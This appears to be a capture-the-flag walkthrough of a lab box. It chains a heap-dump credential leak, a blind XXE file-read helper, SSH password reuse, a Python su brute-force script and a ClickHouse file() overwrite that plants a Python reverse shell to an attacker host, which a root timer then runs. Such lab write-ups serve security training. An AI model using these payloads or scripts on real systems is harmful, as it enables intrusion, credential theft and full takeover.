# Stream

## Find Open Ports and Services Running on the Target IP

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

The scan reveals three services:

- `22/tcp` — OpenSSH
- `80/tcp` — nginx (redirects to `http://api.htb-airport.htb/`)
- `8081/tcp` — uvicorn serving an "AIDX flight-leg ingest" API

Add the discovered hostnames to the `/etc/hosts` file:

```text
<target_ip> htb-airport.htb api.htb-airport.htb
```

---

## Enumerate the AIDX Ingest Service (Port 8081)

Request the service root:

```bash
curl -s http://<target_ip>:8081/
```

Output:

```json
{"service":"AIDX flight-leg ingest","how":{"method":"POST","path":"/feeds/aidx","content_type":"application/xml","max_bytes":262144},"required_elements":["IATA_AIDX_FlightLegNotifRQ","Originator","FlightLeg","LegIdentifier"],"note":"Ingest does not parse. Full validation happens downstream.","health":"GET /health"}
```

Key observations:

- The endpoint accepts AIDX **XML** via `POST /feeds/aidx`.
- "Ingest does not parse. Full validation happens downstream." — the XML is parsed by a separate downstream component, which indicates a blind/second-order injection surface.

---

## Enumerate the API Gateway (Port 80)

Request the API root:

```bash
curl -s http://api.htb-airport.htb/
```

Output:

```json
{"service":"terminal-edge-gateway","status":"operational","upstreams":{"flight-data-service":"UP","boarding-control":"UP","gate-assignment":"UP","passenger-manifest":"UP"}}
```

The service is a gateway routing to several upstreams. Probe an invalid route to fingerprint the stack:

```bash
curl -s "http://api.htb-airport.htb/error?x=1"
```

Output:

```json
{"timestamp":"...Z","status":999,"error":"None"}
```

The `{timestamp, status, error}` body is the default **Spring Boot** error format, indicating a Spring Cloud Gateway.

---

## Discover the Exposed Actuator Endpoint

Enumerate Spring Boot Actuator:

```bash
curl -s http://api.htb-airport.htb/actuator
```

Only a single endpoint is exposed:

```text
/actuator/heapdump
```

(The gateway config exposes `heapdump` explicitly while all other endpoints are disabled — `management.endpoints.access.default = none`.)

---

## Extract Credentials from the Heap Dump

Download the heap dump:

```bash
curl -s http://api.htb-airport.htb/actuator/heapdump -o heapdump.hprof
file heapdump.hprof    # Java HEAP DUMP
```

Analyze it with JDumpSpider:

https://github.com/whwlsfb/JDumpSpider

```bash
java -jar JDumpSpider.jar heapdump.hprof
```

Recovered database credentials (Hikari connection pool):

```text
username = svc_events
password = Yl4aCgh4y2PnU
```

---

## Virtual Host Enumeration

nginx redirects every unknown host to `api.htb-airport.htb`, so filter out the `301` responses:

```bash
ffuf -u http://<target_ip>/ -H "Host: FUZZ.htb-airport.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc all -fc 301
```

Virtual hosts found:

```text
api   (Status: 200)
db    (Status: 200, Size: 4 — ClickHouse "Ok.")
```

Add the database host to the `/etc/hosts` file:

```text
<target_ip> db.htb-airport.htb
```

---

## Access the ClickHouse Database

The ClickHouse HTTP interface is fronted by nginx on port 80 (ports 8123/9000 are bound internally). Authenticate with the recovered credentials:

```bash
CH='http://db.htb-airport.htb'
AUTH='svc_events:Yl4aCgh4y2PnU'

curl -s "$CH/ping"                                             # Ok.
curl -s "$CH/" --user "$AUTH" --data-binary 'SELECT version()' # 26.8.1.1746
```

Enumerate databases and tables:

```bash
curl -s "$CH/" --user "$AUTH" --data-binary 'SHOW DATABASES'               # partner_feed
curl -s "$CH/" --user "$AUTH" --data-binary 'SHOW TABLES FROM partner_feed'
```

Tables:

```text
flightleg_raw         (raw XML storage)
flightleg_raw_kafka   (Kafka engine)
flightleg_raw_mv      (materialized view)
flightleg_json        (parsed fields)
flightleg_json_kafka
flightleg_json_mv
```

Confirm the pipeline source with the Kafka engine table definition:

```bash
curl -s "$CH/" --user "$AUTH" --data-binary 'SHOW CREATE TABLE partner_feed.flightleg_raw_kafka FORMAT TSVRaw'
```

Output:

```text
ENGINE = Kafka
SETTINGS kafka_broker_list = 'localhost:9092',
         kafka_topic_list  = 'aidx.flightleg.raw.v1', ...
```

The flow is: `POST /feeds/aidx` → Kafka topic `aidx.flightleg.raw.v1` → `flightleg_raw_kafka` → materialized view → `flightleg_raw` (raw) and `flightleg_json` (parsed).

Inspect the parsed schema and a sample row to learn the element→column mapping:

```bash
curl -s "$CH/" --user "$AUTH" --data-binary 'DESCRIBE TABLE partner_feed.flightleg_json FORMAT TSV'
curl -s "$CH/" --user "$AUTH" --data-binary 'SELECT * FROM partner_feed.flightleg_json LIMIT 1 FORMAT Vertical'
```

The parser maps AIDX elements to columns — for example `<FlightNumber>` text → `flight_number`. The `flightleg_json` stage runs an XML parser over the ingested document, which is the XXE injection point.

---

## Exploit XXE in the AIDX Ingest Service

The downstream parser that produces `flightleg_json` resolves external entities. The ingest HTTP response is blind, so file contents are read back out of ClickHouse (the parsed storage table).

Define a reusable helper that submits a payload for any file path and reads the result back (run on an attacker host that can reach both `:8081` and the `db` vhost):

```bash
CH='http://db.htb-airport.htb'; AUTH='svc_events:Yl4aCgh4y2PnU'

xxe_read() {
  local target="$1" tid="xxe-$RANDOM"
  cat > /tmp/x.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [ <!ENTITY xxe SYSTEM "file://$target"> ]>
<ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00" Version="22.1" TimeStamp="2026-10-24T00:00:00Z" TransactionIdentifier="$tid" TransactionStatusCode="Update">
  <ns0:Originator CompanyShortName="PWN" TravelSector="A" Code="ZZ" CodeContext="3"/>
  <ns0:DeliveringSystem CompanyShortName="PWN" Name="OPS" CodeContext="3"/>
  <ns0:FlightLeg>
    <ns0:LegIdentifier>
      <ns0:Airline CodeContext="3">ZZ</ns0:Airline>
      <ns0:FlightNumber>&xxe;</ns0:FlightNumber>
      <ns0:DepartureAirport CodeContext="3">AAA</ns0:DepartureAirport>
      <ns0:ArrivalAirport CodeContext="3">BBB</ns0:ArrivalAirport>
      <ns0:OriginDate>2026-10-24</ns0:OriginDate>
      <ns0:RepeatNumber CurrentInd="true">1</ns0:RepeatNumber>
    </ns0:LegIdentifier>
    <ns0:LegData InternationalStatus="Domestic"><ns0:FlightStatus CodeContext="9948">DP</ns0:FlightStatus></ns0:LegData>
  </ns0:FlightLeg>
</ns0:IATA_AIDX_FlightLegNotifRQ>
EOF
  curl -s -X POST http://<target_ip>:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @/tmp/x.xml >/dev/null
  sleep 5
  curl -s "$CH/" --user "$AUTH" --data-binary "SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='$tid' FORMAT TSVRaw"; echo
}
```

The external entity is placed in a **text node** (`<FlightNumber>`) — not an attribute, because XML normalizes newlines in attributes to spaces.

Read `/etc/passwd`:

```bash
xxe_read /etc/passwd
```

Output (users of interest):

```text
svc-infra:x:1000:1000:...:/bin/bash
martin_cole:x:1001:1001:...:/bin/bash
```

Arbitrary file read is confirmed.

> Note: a `SYSTEM` entity's contents are re-parsed as XML, so plain-text files read cleanly while XML files (e.g. `config.xml`) break well-formedness and return empty. Target plain-text files.

---

## Read the Kafka Configuration via XXE

Locate the Kafka service by reading its systemd unit:

```bash
xxe_read /etc/systemd/system/kafka.service
```

Output reveals the install path and that Kafka runs as `svc-infra`:

```text
User=svc-infra
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

Read the broker configuration:

```bash
xxe_read /opt/kafka_2.13-4.3.1/config/server.properties
```

A SASL PLAIN credential is exposed:

```text
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
```

The `user_<name>="<pass>"` syntax defines the Kafka user `svc_infra` with password `Ny2hdpme$bwT3`.

---

## Obtain Initial Shell as svc-infra

The Kafka SASL password is reused for SSH (the OS account is `svc-infra`, with a hyphen):

```bash
ssh svc-infra@<target_ip>
# password: Ny2hdpme$bwT3
```

Verify the user:

```bash
whoami    # svc-infra
```

---

## Local Enumeration as svc-infra

Enumerate privileges, application directories, and scheduled tasks:

```bash
sudo -l 2>/dev/null
ls -la /opt
ls -la /home
systemctl list-timers --all
```

Findings:

- `/opt/ops` is **root-owned** and contains the DLQ drainer logic (privilege-escalation target, revisited later).
- `aidx-dlq-drainer.timer` triggers `aidx-dlq-drainer.service` every ~2 minutes as **root**.
- `/home/martin_cole` exists and holds the user flag — the next lateral target.
- `/opt/sysinternalsEBPF` and `/opt/sysmon` plus the `_laurel` user indicate Sysmon-for-Linux and Laurel auditd logging are active (a brute-force here is noisy).

No password hint for `martin_cole` is found in readable files, so proceed with a `su` brute-force.

---

## Lateral Movement to martin_cole (su Brute-Force)

`su` reads the password from a real TTY, so pipe it through a `pty` loop.

Transfer a wordlist from the attacker host:

```bash
scp /usr/share/wordlists/rockyou.txt svc-infra@<target_ip>:/tmp/words.txt
```

Brute-force script (`/tmp/sb.py`):

```python
#!/usr/bin/env python3
import pty, os, sys, time
user = sys.argv[1]; wl = sys.argv[2]
for raw in open(wl, encoding='latin-1'):
    pw = raw.rstrip('\n')
    pid, fd = pty.fork()
    if pid == 0:
        os.execvp('su', ['su', user, '-c', 'true']); os._exit(1)
    time.sleep(0.05)
    try:
        os.read(fd, 4096); os.write(fd, pw.encode() + b'\n')
    except OSError:
        pass
    _, st = os.waitpid(pid, 0)
    if os.WIFEXITED(st) and os.WEXITSTATUS(st) == 0:
        print(f'[+] PASSWORD: {pw}'); break
```

Run it:

```bash
python3 /tmp/sb.py martin_cole /tmp/words.txt
# [+] PASSWORD: tinkerbell
```

Switch user and stabilize:

```bash
su martin_cole                                   # password: tinkerbell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Retrieve User Flag

```bash
cd /home/martin_cole
cat user.txt
```

The user flag is obtained.

---

# Privilege Escalation

## Analyze the Kopia Backup Repository

martin_cole's home contains a Kopia backup repository:

```bash
ls -la ~/backups                      # filesystem repo (kopia.blobcfg.f)
cat ~/.config/kopia/repository.config.kopia-password
```

The password file is base64-encoded:

```bash
echo dGlua2VyYmVsbA== | base64 -d     # tinkerbell
```

Connect to the repository and list snapshots:

```bash
kopia repository connect filesystem --path /home/martin_cole/backups --password 'tinkerbell'
kopia snapshot list                   # note the snapshot ID (source: ~/ch-logs)
```

Restore the snapshot (ClickHouse logs) and search for credentials:

```bash
mkdir -p /tmp/r
kopia snapshot restore <snapshot_id> /tmp/r
grep -rinE "ALTER USER|IDENTIFIED BY|password" /tmp/r
```

A failed `ALTER USER` statement in the error log leaks the ClickHouse `default` password:

```text
ALTER USER default IDENTIFIED BY 'N3v3rs33nD4T4 ;
```

Confirm access (ClickHouse is reachable on localhost from the box):

```bash
curl -s "http://127.0.0.1:8123/" --user 'default:N3v3rs33nD4T4' --data-binary 'SELECT currentUser()'
# default
```

---

## Analyze the Root-Triggered DLQ Drainer

Read the drainer executed by the root timer:

```bash
cat /opt/ops/dlq_drainer.py
```

Key behavior — for each message on the DLQ Kafka topic, the root process executes a Python formatter located in ClickHouse's `user_files`:

```python
DLQ_TOPIC = "aidx.flightleg.dlq.v1"
FORMATTER = "/var/lib/clickhouse/user_files/aidx_quarantine.py"
subprocess.run(["python3", FORMATTER], input=raw, ...)
```

Confirm the `user_files` path:

```bash
curl -s "http://127.0.0.1:8123/" --user 'default:N3v3rs33nD4T4' --data-binary \
  "SELECT value FROM system.server_settings WHERE name='user_files_path'"
# /var/lib/clickhouse/user_files
```

The `default` user can write into `user_files` via the ClickHouse `file()` table function, overwriting the formatter that root executes. (The `svc_events` user cannot — hence the need for the `default` credentials.)

---

## Abuse the ClickHouse file() Function

Start a listener on the attacker host:

```bash
nc -lvnp <listener_port>
```

Overwrite the formatter with a Python reverse shell via `file()`:

```bash
cat > /tmp/q.sql <<'EOF'
INSERT INTO TABLE FUNCTION file('aidx_quarantine.py','RawBLOB') SELECT 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",<listener_port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' SETTINGS engine_file_truncate_on_insert=1
EOF

curl -s --user 'default:N3v3rs33nD4T4' "http://127.0.0.1:8123/" --data-binary @/tmp/q.sql
```

`RawBLOB` writes exact bytes; `engine_file_truncate_on_insert=1` overwrites the existing formatter.

Verify the write:

```bash
curl -s --user 'default:N3v3rs33nD4T4' "http://127.0.0.1:8123/" --data-binary \
  "SELECT * FROM file('aidx_quarantine.py','LineAsString','l String')"
```

---

## Trigger Root Execution

Produce a message to the DLQ topic the drainer consumes (Kafka on `localhost:9092` permits anonymous produce — `allow.everyone.if.no.acl.found=true`):

```bash
echo 'trigger' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh \
  --bootstrap-server localhost:9092 --topic aidx.flightleg.dlq.v1
```

Alternative trigger — submit a malformed AIDX request that fails downstream validation and is routed to the DLQ:

```bash
curl -s -X POST http://<target_ip>:8081/feeds/aidx -H 'Content-Type: application/xml' --data 'notxml'
```

Execution flow:

```text
default (ClickHouse)
   |
   v  file() write
/var/lib/clickhouse/user_files/aidx_quarantine.py
   |
   v  DLQ message (Kafka)
root aidx-dlq-drainer (systemd timer)
   |
   v  subprocess python3 FORMATTER
root reverse shell
```

Within ~2 minutes the drainer executes the formatter as root and a shell connects back.

---

## Retrieve Root Flag

Verify privileges and stabilize:

```bash
id                                               # uid=0(root)
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Read the root flag:

```bash
cat /root/root.txt
```

The root flag is successfully obtained.

---

# Attack Chain

```text
AIDX Ingest Recon
   → Spring Boot Gateway → Actuator Heapdump → ClickHouse Creds (svc_events)
   → VHost Enumeration (db) → ClickHouse Pipeline Mapping
   → Blind XXE (read via ClickHouse flightleg_json) → Kafka server.properties
   → SSH as svc-infra (credential reuse)
   → su Brute-Force → martin_cole → User Flag
   → Kopia Backup → ClickHouse default Password
   → file() Write to user_files + Root DLQ Drainer → Root Access
```